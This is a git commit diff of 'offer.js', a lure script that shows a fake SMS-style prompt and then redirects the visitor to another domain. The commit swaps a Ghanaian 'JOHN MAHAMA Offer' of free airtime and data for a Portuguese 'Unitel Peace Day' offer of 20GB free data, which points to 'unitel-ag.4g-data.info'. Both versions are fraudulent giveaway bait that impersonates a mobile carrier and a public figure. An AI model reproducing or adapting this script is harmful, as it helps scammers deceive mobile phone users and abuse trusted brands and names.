b577b9bde647ca9e8b599152af0a42e44aec44f5
uptomars <Kenoly555+me@gmail.com>
2025-03-31 05:22:02 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '20GB de dados gratuitos'
+password=prompt('SMS: Parabéns, seu número é elegível para receber 20GB DE DADOS GRÁTIS OFERTA DE COMEMORAÇÃO DO DIA DA PAZ DA UNITEL, pressione OK para ATIVAR','20GB de dados gratuitos');
+if (password != '20GB de dados gratuitos') {
+location.href='https://unitel-ag.4g-data.info/20GB';
 }
